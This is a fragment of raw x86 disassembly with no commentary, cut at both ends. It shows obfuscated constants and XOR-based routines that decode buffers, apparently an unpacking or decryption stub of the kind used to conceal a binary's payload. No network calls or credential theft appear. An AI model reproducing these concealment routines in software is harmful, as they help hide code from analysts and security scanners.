  424e03:	xor    ecx,ebx
  424e05:	add    ecx,esi
  424e07:	xor    DWORD PTR [eax],ecx
  424e09:	mov    eax,DWORD PTR [ebp-0x10]
  424e0c:	mov    ecx,DWORD PTR [ebp-0x2c]
  424e0f:	xor    eax,ebx
  424e11:	add    eax,esi
  424e13:	cmp    eax,ecx
  424e15:	je     0x42558f
  424e1b:	mov    eax,DWORD PTR [ebp-0x10]
  424e1e:	mov    ecx,DWORD PTR [ebp-0x3c]
  424e21:	xor    eax,ebx
  424e23:	add    eax,esi
  424e25:	cmp    eax,ecx
  424e27:	je     0x42558f
  424e2d:	mov    eax,DWORD PTR [ebp-0x10]
  424e30:	xor    eax,ebx
  424e32:	add    eax,esi
  424e34:	jmp    0x424e52
  424e36:	mov    edi,DWORD PTR [ebp-0x2c]
  424e39:	mov    cl,al
  424e3b:	and    cl,0x1f
  424e3e:	or     dl,0xff
  424e41:	sub    dl,cl
  424e43:	add    BYTE PTR [edi+eax*1],dl
  424e46:	mov    ecx,DWORD PTR [ebp-0x18]
  424e49:	xor    ecx,ebx
  424e4b:	lea    eax,[eax+ecx*1+0x3272f6]
  424e52:	mov    ecx,DWORD PTR [ebp-0x3c]
  424e55:	cmp    eax,ecx
  424e57:	jb     0x424e36
  424e59:	mov    eax,DWORD PTR [ebp-0x3c]
  424e5c:	mov    DWORD PTR [ebp-0x28],eax
  424e5f:	mov    eax,DWORD PTR [ebp-0x2c]
  424e62:	mov    DWORD PTR [ebp-0x34],0xf89c85a5
  424e69:	mov    DWORD PTR [ebp-0xd4],eax
  424e6f:	mov    edi,0xf89c85a4
  424e74:	mov    DWORD PTR [ebp-0x30],edi
  424e77:	mov    eax,DWORD PTR [ebp-0x34]
  424e7a:	xor    eax,ebx
  424e7c:	add    eax,esi
  424e7e:	mov    DWORD PTR [ebp-0xc],eax
  424e81:	mov    eax,DWORD PTR [ebp-0x34]
  424e84:	xor    eax,ebx
  424e86:	add    eax,esi
  424e88:	mov    DWORD PTR [ebp-0x8],eax
  424e8b:	mov    DWORD PTR [ebp-0x44],0xf89c8585
  424e92:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  424e99:	mov    eax,DWORD PTR [ebp-0x34]
  424e9c:	mov    ecx,DWORD PTR [ebp-0x28]
  424e9f:	xor    eax,ebx
  424ea1:	add    eax,esi
  424ea3:	cmp    ecx,eax
  424ea5:	je     0x4250a4
  424eab:	jmp    0x425080
  424eb0:	mov    ecx,DWORD PTR [ebp-0xc]
  424eb3:	mov    eax,DWORD PTR [ebp-0x28]
  424eb6:	sub    eax,ecx
  424eb8:	mov    ecx,DWORD PTR [ebp-0x44]
  424ebb:	xor    ecx,ebx
  424ebd:	add    ecx,esi
  424ebf:	xor    edx,edx
  424ec1:	div    ecx
  424ec3:	mov    DWORD PTR [ebp-0x8],eax
  424ec6:	mov    eax,DWORD PTR [ebp-0x4c]
  424ec9:	mov    ecx,DWORD PTR [ebp-0x8]
  424ecc:	xor    eax,ebx
  424ece:	add    eax,esi
  424ed0:	cmp    ecx,eax
  424ed2:	jbe    0x424ede
  424ed4:	mov    eax,DWORD PTR [ebp-0x4c]
  424ed7:	xor    eax,ebx
  424ed9:	add    eax,esi
  424edb:	mov    DWORD PTR [ebp-0x8],eax
  424ede:	mov    eax,DWORD PTR [ebp-0x44]
  424ee1:	mov    ecx,DWORD PTR [ebp-0x8]
  424ee4:	xor    eax,ebx
  424ee6:	add    eax,esi
  424ee8:	imul   eax,ecx
  424eeb:	mov    DWORD PTR [ebp-0x8],eax
  424eee:	mov    eax,DWORD PTR [ebp-0x34]
  424ef1:	mov    ecx,DWORD PTR [ebp-0x8]
  424ef4:	xor    eax,ebx
  424ef6:	add    eax,esi
  424ef8:	cmp    ecx,eax
  424efa:	je     0x42506e
  424f00:	mov    eax,DWORD PTR [ebp-0x8]
  424f03:	mov    DWORD PTR [ebp-0x14],eax
  424f06:	mov    eax,DWORD PTR [ebp-0xc]
  424f09:	add    eax,DWORD PTR [ebp-0xd4]
  424f0f:	mov    DWORD PTR [ebp-0x24],0xf89c85a5
  424f16:	mov    DWORD PTR [ebp-0x20],edi
  424f19:	mov    DWORD PTR [ebp-0xe8],0xf89c85a3
  424f23:	mov    DWORD PTR [ebp-0x8],eax
  424f26:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  424f2d:	mov    DWORD PTR [ebp-0x1c],edi
  424f30:	mov    eax,DWORD PTR [ebp-0x24]
  424f33:	xor    eax,ebx
  424f35:	add    eax,esi
  424f37:	jmp    0x42502d
  424f3c:	mov    DWORD PTR [ebp-0xe0],0xf89c85ba
  424f46:	mov    DWORD PTR [ebp-0xc4],0xf89c858f
  424f50:	mov    eax,DWORD PTR [ebp-0x1c]
  424f53:	mov    ecx,DWORD PTR [ebp-0x48]
  424f56:	xor    eax,ebx
  424f58:	add    eax,esi
  424f5a:	imul   eax,ecx
  424f5d:	mov    ecx,DWORD PTR [ebp-0x8]
  424f60:	mov    al,BYTE PTR [eax+ecx*1]
  424f63:	mov    BYTE PTR [ebp-0x2],al
  424f66:	mov    eax,DWORD PTR [ebp-0x1c]
  424f69:	mov    ecx,DWORD PTR [ebp-0x48]
  424f6c:	xor    eax,ebx
  424f6e:	add    eax,esi
  424f70:	imul   eax,ecx
  424f73:	mov    ecx,DWORD PTR [ebp-0xe8]
  424f79:	xor    ecx,ebx
  424f7b:	add    eax,ecx
  424f7d:	mov    ecx,DWORD PTR [ebp-0x8]
  424f80:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  424f88:	mov    ecx,DWORD PTR [ebp-0xe0]
  424f8e:	xor    ecx,ebx
  424f90:	lea    eax,[ecx+eax*1+0x3272f6]
  424f97:	movzx  ecx,BYTE PTR [ebp-0x2]
  424f9b:	xor    ecx,eax
  424f9d:	mov    BYTE PTR [ebp-0x2],cl
  424fa0:	mov    al,BYTE PTR [ebp-0x2]
  424fa3:	mov    ecx,DWORD PTR [ebp-0x1c]
  424fa6:	mov    edx,DWORD PTR [ebp-0x48]
  424fa9:	xor    ecx,ebx
  424fab:	add    ecx,esi
  424fad:	imul   ecx,edx
  424fb0:	mov    edx,DWORD PTR [ebp-0x8]
  424fb3:	mov    BYTE PTR [ecx+edx*1],al
  424fb6:	mov    eax,DWORD PTR [ebp-0x1c]
  424fb9:	mov    ecx,DWORD PTR [ebp-0x48]
  424fbc:	xor    eax,ebx
  424fbe:	add    eax,esi
  424fc0:	imul   eax,ecx
  424fc3:	mov    ecx,DWORD PTR [ebp-0x8]
  424fc6:	mov    al,BYTE PTR [eax+ecx*1]
  424fc9:	mov    BYTE PTR [ebp-0x2],al
  424fcc:	mov    eax,DWORD PTR [ebp-0x1c]
  424fcf:	mov    ecx,DWORD PTR [ebp-0x48]
  424fd2:	xor    eax,ebx
  424fd4:	add    eax,esi
  424fd6:	imul   eax,ecx
  424fd9:	mov    ecx,DWORD PTR [ebp-0x20]
  424fdc:	xor    ecx,ebx
  424fde:	add    eax,ecx
  424fe0:	mov    ecx,DWORD PTR [ebp-0x8]
  424fe3:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  424feb:	mov    ecx,DWORD PTR [ebp-0xc4]
  424ff1:	xor    ecx,ebx
  424ff3:	lea    eax,[ecx+eax*1+0x3272f6]
  424ffa:	movzx  ecx,BYTE PTR [ebp-0x2]
  424ffe:	xor    ecx,eax
  425000:	mov    BYTE PTR [ebp-0x2],cl
  425003:	mov    al,BYTE PTR [ebp-0x2]
  425006:	mov    ecx,DWORD PTR [ebp-0x1c]
  425009:	mov    edx,DWORD PTR [ebp-0x48]
  42500c:	xor    ecx,ebx
  42500e:	add    ecx,esi
  425010:	imul   ecx,edx
  425013:	mov    edx,DWORD PTR [ebp-0x8]
  425016:	mov    BYTE PTR [ecx+edx*1],al
  425019:	mov    eax,DWORD PTR [ebp-0x38]
  42501c:	mov    ecx,DWORD PTR [ebp-0x20]
  42501f:	xor    eax,ebx
  425021:	xor    ecx,ebx
  425023:	add    eax,esi
  425025:	add    ecx,esi
  425027:	imul   eax,ecx
  42502a:	add    eax,DWORD PTR [ebp-0x48]
  42502d:	mov    DWORD PTR [ebp-0x48],eax
  425030:	mov    eax,DWORD PTR [ebp-0x48]
  425033:	mov    ecx,DWORD PTR [ebp-0x14]
  425036:	cmp    ecx,eax
  425038:	jb     0x424f3c
  42503e:	mov    eax,DWORD PTR [ebp-0x20]
  425041:	mov    ecx,DWORD PTR [ebp-0x14]
  425044:	xor    eax,ebx
  425046:	add    eax,esi
  425048:	imul   eax,ecx
  42504b:	mov    ecx,DWORD PTR [ebp-0x24]
  42504e:	xor    ecx,ebx
  425050:	add    ecx,esi
  425052:	or     eax,ecx
  425054:	mov    ecx,DWORD PTR [ebp-0x30]
  425057:	xor    ecx,ebx
  425059:	add    eax,ecx
  42505b:	mov    ecx,DWORD PTR [ebp-0x30]
  42505e:	xor    ecx,ebx
  425060:	add    eax,ecx
  425062:	mov    ecx,DWORD PTR [ebp-0xc]
  425065:	lea    eax,[eax+ecx*1+0x64e5ec]
  42506c:	jmp    0x42507d
  42506e:	mov    eax,DWORD PTR [ebp-0x30]
  425071:	mov    ecx,DWORD PTR [ebp-0xc]
  425074:	xor    eax,ebx
  425076:	lea    eax,[eax+ecx*1+0x3272f6]
  42507d:	mov    DWORD PTR [ebp-0xc],eax
  425080:	mov    eax,DWORD PTR [ebp-0x30]
  425083:	xor    eax,ebx
  425085:	mov    ecx,0xffcd8d0a
  42508a:	sub    ecx,eax
  42508c:	add    ecx,DWORD PTR [ebp-0x28]
  42508f:	mov    eax,DWORD PTR [ebp-0x30]
  425092:	mov    edx,DWORD PTR [ebp-0xc]
  425095:	xor    eax,ebx
  425097:	add    eax,esi
  425099:	imul   eax,edx
  42509c:	cmp    eax,ecx
  42509e:	jbe    0x424eb0
  4250a4:	mov    eax,DWORD PTR [ebp-0x10]
  4250a7:	mov    ecx,DWORD PTR [ebp-0x3c]
  4250aa:	mov    eax,DWORD PTR [ebp+0x8]
  4250ad:	mov    edx,DWORD PTR [ebp-0x54]
  4250b0:	mov    eax,DWORD PTR [eax+0x1e0]
  4250b6:	xor    edx,ebx
  4250b8:	add    edx,esi
  4250ba:	push   edx
  4250bb:	mov    edx,DWORD PTR [ebp-0x40]
  4250be:	xor    edx,ebx
  4250c0:	add    edx,esi
  4250c2:	push   edx
  4250c3:	push   ecx
  4250c4:	mov    DWORD PTR [ebp-0x38],ecx
  4250c7:	mov    ecx,DWORD PTR [ebp-0x10]
  4250ca:	xor    ecx,ebx
  4250cc:	add    ecx,esi
  4250ce:	push   ecx
  4250cf:	call   DWORD PTR [eax+0x14]
  4250d2:	mov    edi,eax
  4250d4:	mov    eax,DWORD PTR [ebp-0x10]
  4250d7:	xor    eax,ebx
  4250d9:	add    eax,esi
  4250db:	cmp    eax,edi
  4250dd:	je     0x425138
  4250df:	mov    eax,DWORD PTR [ebp-0x10]
  4250e2:	jmp    0x425105
  4250e4:	mov    ecx,DWORD PTR [ebp-0x2c]
  4250e7:	xor    eax,ebx
  4250e9:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f6]
  4250f0:	mov    BYTE PTR [eax+edi*1+0x3272f6],cl
  4250f7:	mov    ecx,DWORD PTR [ebp-0x18]
  4250fa:	xor    ecx,ebx
  4250fc:	lea    eax,[ecx+eax*1+0x3272f6]
  425103:	xor    eax,ebx
  425105:	mov    ecx,DWORD PTR [ebp-0x3c]
  425108:	sub    ecx,esi
  42510a:	xor    ecx,ebx
  42510c:	cmp    eax,ecx
  42510e:	jne    0x4250e4
  425110:	mov    eax,DWORD PTR [ebp+0x8]
  425113:	mov    ecx,DWORD PTR [ebp-0x50]
  425116:	mov    eax,DWORD PTR [eax+0x1e0]
  42511c:	xor    ecx,ebx
  42511e:	add    ecx,esi
  425120:	push   ecx
  425121:	mov    ecx,DWORD PTR [ebp-0x10]
  425124:	xor    ecx,ebx
  425126:	add    ecx,esi
  425128:	push   ecx
  425129:	push   DWORD PTR [ebp-0x2c]
  42512c:	call   DWORD PTR [eax+0x18]
  42512f:	mov    eax,DWORD PTR [ebp-0x38]
  425132:	mov    DWORD PTR [ebp-0x2c],edi
  425135:	mov    DWORD PTR [ebp-0x3c],eax
  425138:	mov    eax,DWORD PTR [ebp-0x2c]
  42513b:	mov    DWORD PTR [ebp-0x14],eax
  42513e:	mov    eax,DWORD PTR [ebp-0x18]
  425141:	mov    ecx,DWORD PTR [ebp-0x10]
  425144:	xor    eax,ebx
  425146:	add    eax,esi
  425148:	mov    DWORD PTR [ebp-0x5c],0x422b332b
  42514f:	mov    DWORD PTR [ebp-0x58],0x382b402b
  425156:	jmp    0x425189
  425158:	mov    edx,DWORD PTR [ebp-0x14]
  42515b:	mov    edi,ecx
  42515d:	xor    edi,ebx
  42515f:	mov    cl,BYTE PTR [ebp+edi*1+0x32729a]
  425166:	movsx  edx,BYTE PTR [edi+edx*1+0x3272f6]
  42516e:	xor    cl,0x7f
  425171:	add    cl,0x4
  425174:	movzx  ecx,cl
  425177:	cmp    edx,ecx
  425179:	jne    0x425193
  42517b:	mov    ecx,DWORD PTR [ebp-0x18]
  42517e:	xor    ecx,ebx
  425180:	lea    ecx,[ecx+edi*1+0x3272f6]
  425187:	xor    ecx,ebx
  425189:	cmp    ecx,0xf89c85bd
  42518f:	jne    0x425158
  425191:	jmp    0x42519a
  425193:	mov    eax,DWORD PTR [ebp-0x10]
  425196:	xor    eax,ebx
  425198:	add    eax,esi
  42519a:	mov    ecx,DWORD PTR [ebp-0x10]
  42519d:	xor    ecx,ebx
  42519f:	add    ecx,esi
  4251a1:	cmp    ecx,eax
  4251a3:	je     0x425319
  4251a9:	mov    eax,DWORD PTR [ebp-0x14]
  4251ac:	mov    eax,DWORD PTR [eax+0x8]
  4251af:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4251b6:	mov    DWORD PTR [ebp-0x40],0xf89cc3d6
  4251bd:	mov    DWORD PTR [ebp-0x44],0xf89cb5a5
  4251c4:	mov    DWORD PTR [ebp-0x24],0xf89c85a1
  4251cb:	mov    DWORD PTR [ebp-0x20],eax
  4251ce:	mov    eax,DWORD PTR [ebp+0x8]
  4251d1:	mov    ecx,DWORD PTR [ebp-0x24]
  4251d4:	xor    ecx,ebx
  4251d6:	add    ecx,esi
  4251d8:	push   ecx
  4251d9:	mov    ecx,DWORD PTR [ebp-0x44]
  4251dc:	mov    eax,DWORD PTR [eax+0x1e0]
  4251e2:	xor    ecx,ebx
  4251e4:	add    ecx,esi
  4251e6:	push   ecx
  4251e7:	mov    ecx,DWORD PTR [ebp-0x40]
  4251ea:	xor    ecx,ebx
  4251ec:	add    ecx,esi
  4251ee:	push   ecx
  4251ef:	mov    ecx,DWORD PTR [ebp-0xc]
  4251f2:	xor    ecx,ebx
  4251f4:	add    ecx,esi
  4251f6:	push   ecx
  4251f7:	call   DWORD PTR [eax+0x14]
  4251fa:	mov    edi,eax
  4251fc:	mov    eax,DWORD PTR [ebp+0x8]
  4251ff:	mov    ecx,DWORD PTR [ebp-0x24]
  425202:	mov    eax,DWORD PTR [eax+0x1e0]
  425208:	xor    ecx,ebx
  42520a:	add    ecx,esi
  42520c:	push   ecx
  42520d:	mov    ecx,DWORD PTR [ebp-0x44]
  425210:	xor    ecx,ebx
  425212:	add    ecx,esi
  425214:	push   ecx
  425215:	mov    ecx,DWORD PTR [ebp-0xc]
  425218:	push   DWORD PTR [ebp-0x20]
  42521b:	xor    ecx,ebx
  42521d:	add    ecx,esi
  42521f:	push   ecx
  425220:	call   DWORD PTR [eax+0x14]
  425223:	mov    ecx,DWORD PTR [ebp-0xc]
  425226:	xor    ecx,ebx
  425228:	add    ecx,esi
  42522a:	mov    DWORD PTR [ebp-0x24],eax
  42522d:	cmp    ecx,edi
  42522f:	je     0x4255bc
  425235:	mov    ecx,DWORD PTR [ebp-0xc]
  425238:	xor    ecx,ebx
  42523a:	add    ecx,esi
  42523c:	cmp    ecx,eax
  42523e:	je     0x4255bc
  425244:	mov    DWORD PTR [ebp-0x40],0xf89c85a2
  42524b:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  425252:	mov    ecx,DWORD PTR [ebp-0x40]
  425255:	xor    cl,0xaf
  425258:	sub    cl,0xa
  42525b:	mov    BYTE PTR [edi],cl
  42525d:	mov    ecx,DWORD PTR [ebp-0xc]
  425260:	xor    cl,0xaf
  425263:	sub    cl,0xa
  425266:	mov    BYTE PTR [edi+0x1],cl
  425269:	mov    ecx,DWORD PTR [ebp-0x54]
  42526c:	xor    cl,0xaf
  42526f:	sub    cl,0xa
  425272:	mov    BYTE PTR [edi+0x2],cl
  425275:	and    DWORD PTR [ebp-0xc8],0x0
  42527c:	and    DWORD PTR [ebp-0xdc],0x0
  425283:	lea    ecx,[ebp-0xdc]
  425289:	push   ecx
  42528a:	push   DWORD PTR [ebp-0x20]
  42528d:	push   eax
  42528e:	lea    eax,[ebp-0xc8]
  425294:	push   eax
  425295:	mov    eax,DWORD PTR [ebp-0x14]
  425298:	push   DWORD PTR [eax+0xc]
  42529b:	mov    eax,DWORD PTR [ebp-0x2c]
  42529e:	add    eax,0x10
  4252a1:	push   eax
  4252a2:	push   edi
  4252a3:	call   0x424547
  4252a8:	mov    DWORD PTR [ebp-0x40],eax
  4252ab:	mov    eax,DWORD PTR [ebp+0x8]
  4252ae:	mov    ecx,DWORD PTR [ebp-0x50]
  4252b1:	mov    eax,DWORD PTR [eax+0x1e0]
  4252b7:	xor    ecx,ebx
  4252b9:	add    ecx,esi
  4252bb:	push   ecx
  4252bc:	mov    ecx,DWORD PTR [ebp-0xc]
  4252bf:	xor    ecx,ebx
  4252c1:	add    ecx,esi
  4252c3:	push   ecx
  4252c4:	push   edi
  4252c5:	call   DWORD PTR [eax+0x18]
  4252c8:	mov    eax,DWORD PTR [ebp-0x40]
  4252cb:	add    eax,0xffcd8d0a
  4252d0:	xor    eax,ebx
  4252d2:	cmp    eax,0xf89c85a5
  4252d7:	mov    eax,DWORD PTR [ebp+0x8]
  4252da:	mov    eax,DWORD PTR [eax+0x1e0]
  4252e0:	mov    ecx,DWORD PTR [ebp-0x50]
  4252e3:	jne    0x425306
  4252e5:	xor    ecx,ebx
  4252e7:	add    ecx,esi
  4252e9:	push   ecx
  4252ea:	mov    ecx,DWORD PTR [ebp-0xc]
  4252ed:	xor    ecx,ebx
  4252ef:	add    ecx,esi
  4252f1:	push   ecx
  4252f2:	push   DWORD PTR [ebp-0x2c]
  4252f5:	call   DWORD PTR [eax+0x18]
  4252f8:	mov    eax,DWORD PTR [ebp-0x24]
  4252fb:	mov    DWORD PTR [ebp-0x2c],eax
  4252fe:	mov    eax,DWORD PTR [ebp-0x20]
  425301:	mov    DWORD PTR [ebp-0x3c],eax
  425304:	jmp    0x425319
  425306:	xor    ecx,ebx
  425308:	add    ecx,esi
  42530a:	push   ecx
  42530b:	mov    ecx,DWORD PTR [ebp-0xc]
  42530e:	xor    ecx,ebx
  425310:	add    ecx,esi
  425312:	push   ecx
  425313:	push   DWORD PTR [ebp-0x24]
  425316:	call   DWORD PTR [eax+0x18]
  425319:	mov    eax,DWORD PTR [ebp-0x3c]
  42531c:	mov    DWORD PTR [ebp-0x34],eax
  42531f:	mov    eax,DWORD PTR [ebp-0x2c]
  425322:	mov    DWORD PTR [ebp-0x28],0xf89c85a5
  425329:	mov    DWORD PTR [ebp-0x40],eax
  42532c:	mov    edi,0xf89c85a4
  425331:	mov    DWORD PTR [ebp-0x30],edi
  425334:	mov    eax,DWORD PTR [ebp-0x28]
  425337:	xor    eax,ebx
  425339:	add    eax,esi
  42533b:	mov    DWORD PTR [ebp-0xc],eax
  42533e:	mov    eax,DWORD PTR [ebp-0x28]
  425341:	xor    eax,ebx
  425343:	add    eax,esi
  425345:	mov    DWORD PTR [ebp-0x14],eax
  425348:	mov    DWORD PTR [ebp-0x44],0xf89c8585
  42534f:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  425356:	mov    eax,DWORD PTR [ebp-0x28]
  425359:	mov    ecx,DWORD PTR [ebp-0x34]
  42535c:	xor    eax,ebx
  42535e:	add    eax,esi
  425360:	cmp    ecx,eax
  425362:	je     0x425558
  425368:	jmp    0x425534
  42536d:	mov    ecx,DWORD PTR [ebp-0xc]
  425370:	mov    eax,DWORD PTR [ebp-0x34]
  425373:	sub    eax,ecx
  425375:	mov    ecx,DWORD PTR [ebp-0x44]
  425378:	xor    ecx,ebx
  42537a:	add    ecx,esi
  42537c:	xor    edx,edx
  42537e:	div    ecx
  425380:	mov    DWORD PTR [ebp-0x14],eax
  425383:	mov    eax,DWORD PTR [ebp-0x24]
  425386:	mov    ecx,DWORD PTR [ebp-0x14]
  425389:	xor    eax,ebx
  42538b:	add    eax,esi
  42538d:	cmp    ecx,eax
  42538f:	jbe    0x42539b
  425391:	mov    eax,DWORD PTR [ebp-0x24]
  425394:	xor    eax,ebx
  425396:	add    eax,esi
  425398:	mov    DWORD PTR [ebp-0x14],eax
  42539b:	mov    eax,DWORD PTR [ebp-0x44]
  42539e:	mov    ecx,DWORD PTR [ebp-0x14]
  4253a1:	xor    eax,ebx
  4253a3:	add    eax,esi
  4253a5:	imul   eax,ecx
  4253a8:	mov    DWORD PTR [ebp-0x14],eax
  4253ab:	mov    eax,DWORD PTR [ebp-0x28]
  4253ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4253b1:	xor    eax,ebx
  4253b3:	add    eax,esi
  4253b5:	cmp    ecx,eax
  4253b7:	je     0x425522
  4253bd:	mov    eax,DWORD PTR [ebp-0x14]
  4253c0:	mov    DWORD PTR [ebp-0x20],eax
  4253c3:	mov    eax,DWORD PTR [ebp-0xc]
  4253c6:	add    eax,DWORD PTR [ebp-0x40]
  4253c9:	mov    DWORD PTR [ebp-0x4c],0xf89c85a5
  4253d0:	mov    DWORD PTR [ebp-0x14],edi
  4253d3:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  4253da:	mov    DWORD PTR [ebp-0x1c],eax
  4253dd:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  4253e4:	mov    DWORD PTR [ebp-0x8],edi
  4253e7:	mov    eax,DWORD PTR [ebp-0x4c]
  4253ea:	xor    eax,ebx
  4253ec:	add    eax,esi
  4253ee:	jmp    0x4254e1
  4253f3:	mov    DWORD PTR [ebp-0xe4],0xf89c85ba
  4253fd:	mov    DWORD PTR [ebp-0xd0],0xf89c858f
  425407:	mov    eax,DWORD PTR [ebp-0x8]
  42540a:	mov    ecx,DWORD PTR [ebp-0x18]
  42540d:	xor    eax,ebx
  42540f:	add    eax,esi
  425411:	imul   eax,ecx
  425414:	mov    ecx,DWORD PTR [ebp-0x1c]
  425417:	mov    al,BYTE PTR [eax+ecx*1]
  42541a:	mov    BYTE PTR [ebp-0x1],al
  42541d:	mov    eax,DWORD PTR [ebp-0x8]
  425420:	mov    ecx,DWORD PTR [ebp-0x18]
  425423:	xor    eax,ebx
  425425:	add    eax,esi
  425427:	imul   eax,ecx
  42542a:	mov    ecx,DWORD PTR [ebp-0x54]
  42542d:	xor    ecx,ebx
  42542f:	add    eax,ecx
  425431:	mov    ecx,DWORD PTR [ebp-0x1c]
  425434:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  42543c:	mov    ecx,DWORD PTR [ebp-0xe4]
  425442:	xor    ecx,ebx
  425444:	lea    eax,[ecx+eax*1+0x3272f6]
  42544b:	movzx  ecx,BYTE PTR [ebp-0x1]
  42544f:	xor    ecx,eax
  425451:	mov    BYTE PTR [ebp-0x1],cl
  425454:	mov    al,BYTE PTR [ebp-0x1]
  425457:	mov    ecx,DWORD PTR [ebp-0x8]
  42545a:	mov    edx,DWORD PTR [ebp-0x18]
  42545d:	xor    ecx,ebx
  42545f:	add    ecx,esi
  425461:	imul   ecx,edx
  425464:	mov    edx,DWORD PTR [ebp-0x1c]
  425467:	mov    BYTE PTR [ecx+edx*1],al
  42546a:	mov    eax,DWORD PTR [ebp-0x8]
  42546d:	mov    ecx,DWORD PTR [ebp-0x18]
  425470:	xor    eax,ebx
  425472:	add    eax,esi
  425474:	imul   eax,ecx
  425477:	mov    ecx,DWORD PTR [ebp-0x1c]
  42547a:	mov    al,BYTE PTR [eax+ecx*1]
  42547d:	mov    BYTE PTR [ebp-0x1],al
  425480:	mov    eax,DWORD PTR [ebp-0x8]
  425483:	mov    ecx,DWORD PTR [ebp-0x18]
  425486:	xor    eax,ebx
  425488:	add    eax,esi
  42548a:	imul   eax,ecx
  42548d:	mov    ecx,DWORD PTR [ebp-0x14]
  425490:	xor    ecx,ebx
  425492:	add    eax,ecx
  425494:	mov    ecx,DWORD PTR [ebp-0x1c]
  425497:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  42549f:	mov    ecx,DWORD PTR [ebp-0xd0]
  4254a5:	xor    ecx,ebx
  4254a7:	lea    eax,[ecx+eax*1+0x3272f6]
  4254ae:	movzx  ecx,BYTE PTR [ebp-0x1]
  4254b2:	xor    ecx,eax
  4254b4:	mov    BYTE PTR [ebp-0x1],cl
  4254b7:	mov    al,BYTE PTR [ebp-0x1]
  4254ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4254bd:	mov    edx,DWORD PTR [ebp-0x18]
  4254c0:	xor    ecx,ebx
  4254c2:	add    ecx,esi
  4254c4:	imul   ecx,edx
  4254c7:	mov    edx,DWORD PTR [ebp-0x1c]
  4254ca:	mov    BYTE PTR [ecx+edx*1],al
  4254cd:	mov    eax,DWORD PTR [ebp-0x38]
  4254d0:	mov    ecx,DWORD PTR [ebp-0x14]
  4254d3:	xor    eax,ebx
  4254d5:	xor    ecx,ebx
  4254d7:	add    eax,esi
  4254d9:	add    ecx,esi
  4254db:	imul   eax,ecx
  4254de:	add    eax,DWORD PTR [ebp-0x18]
  4254e1:	mov    DWORD PTR [ebp-0x18],eax
  4254e4:	mov    eax,DWORD PTR [ebp-0x18]
  4254e7:	mov    ecx,DWORD PTR [ebp-0x20]
  4254ea:	cmp    ecx,eax
  4254ec:	jb     0x4253f3
  4254f2:	mov    eax,DWORD PTR [ebp-0x14]
  4254f5:	mov    ecx,DWORD PTR [ebp-0x20]
  4254f8:	xor    eax,ebx
  4254fa:	add    eax,esi
  4254fc:	imul   eax,ecx
  4254ff:	mov    ecx,DWORD PTR [ebp-0x4c]
  425502:	xor    ecx,ebx
  425504:	add    ecx,esi
  425506:	or     eax,ecx
  425508:	mov    ecx,DWORD PTR [ebp-0x30]
  42550b:	xor    ecx,ebx
  42550d:	add    eax,ecx
  42550f:	mov    ecx,DWORD PTR [ebp-0x30]
  425512:	xor    ecx,ebx
  425514:	add    eax,ecx
  425516:	mov    ecx,DWORD PTR [ebp-0xc]
  425519:	lea    eax,[eax+ecx*1+0x64e5ec]
  425520:	jmp    0x425531
  425522:	mov    eax,DWORD PTR [ebp-0x30]
  425525:	mov    ecx,DWORD PTR [ebp-0xc]
  425528:	xor    eax,ebx
  42552a:	lea    eax,[eax+ecx*1+0x3272f6]
  425531:	mov    DWORD PTR [ebp-0xc],eax
  425534:	mov    eax,DWORD PTR [ebp-0x30]
  425537:	xor    eax,ebx
  425539:	mov    ecx,0xffcd8d0a
  42553e:	sub    ecx,eax
  425540:	add    ecx,DWORD PTR [ebp-0x34]
  425543:	mov    eax,DWORD PTR [ebp-0x30]
  425546:	mov    edx,DWORD PTR [ebp-0xc]
  425549:	xor    eax,ebx
  42554b:	add    eax,esi
  42554d:	imul   eax,edx
  425550:	cmp    eax,ecx
  425552:	jbe    0x42536d
  425558:	push   DWORD PTR [ebp+0x8]
  42555b:	mov    eax,DWORD PTR [ebp+0x8]
  42555e:	push   DWORD PTR [eax+0x1cc]
  425564:	lea    eax,[ebp-0xd8]
  42556a:	push   eax
  42556b:	mov    eax,DWORD PTR [ebp+0x8]
  42556e:	mov    eax,DWORD PTR [eax+0x1c4]
  425574:	push   DWORD PTR [eax]
  425576:	mov    eax,DWORD PTR [ebp+0x8]
  425579:	mov    eax,DWORD PTR [eax+0x1c0]
  42557f:	push   DWORD PTR [eax]
  425581:	push   DWORD PTR [ebp-0x3c]
  425584:	push   DWORD PTR [ebp-0x2c]
  425587:	call   0x42601e
  42558c:	mov    DWORD PTR [ebp-0x40],eax
  42558f:	mov    eax,DWORD PTR [ebp-0x10]
  425592:	mov    ecx,DWORD PTR [ebp-0x2c]
  425595:	xor    eax,ebx
  425597:	add    eax,esi
  425599:	cmp    eax,ecx
  42559b:	je     0x4255bc
  42559d:	mov    eax,DWORD PTR [ebp+0x8]
  4255a0:	mov    ecx,DWORD PTR [ebp-0x50]
  4255a3:	mov    eax,DWORD PTR [eax+0x1e0]
  4255a9:	xor    ecx,ebx
  4255ab:	add    ecx,esi
  4255ad:	push   ecx
  4255ae:	mov    ecx,DWORD PTR [ebp-0x10]
  4255b1:	xor    ecx,ebx
  4255b3:	add    ecx,esi
  4255b5:	push   ecx
  4255b6:	push   DWORD PTR [ebp-0x2c]
  4255b9:	call   DWORD PTR [eax+0x18]
  4255bc:	pop    edi
  4255bd:	pop    esi
  4255be:	pop    ebx
  4255bf:	leave  
  4255c0:	ret    0x4
  4255c3:	push   ebp
  4255c4:	mov    ebp,esp
  4255c6:	push   ecx
  4255c7:	push   ecx
  4255c8:	lea    eax,[ebp-0x8]
  4255cb:	mov    DWORD PTR [ebp-0x4],eax
  4255ce:	push   esi
  4255cf:	mov    esi,DWORD PTR [ebp-0x4]
  4255d2:	mov    eax,0xf881ba2f
  4255d7:	mov    DWORD PTR [esi],eax
  4255d9:	mov    esi,DWORD PTR [ebp-0x8]
  4255dc:	cmp    esi,eax
  4255de:	pop    esi
  4255df:	jne    0x4255e9
  4255e1:	mov    BYTE PTR [ecx+0xa],0x83
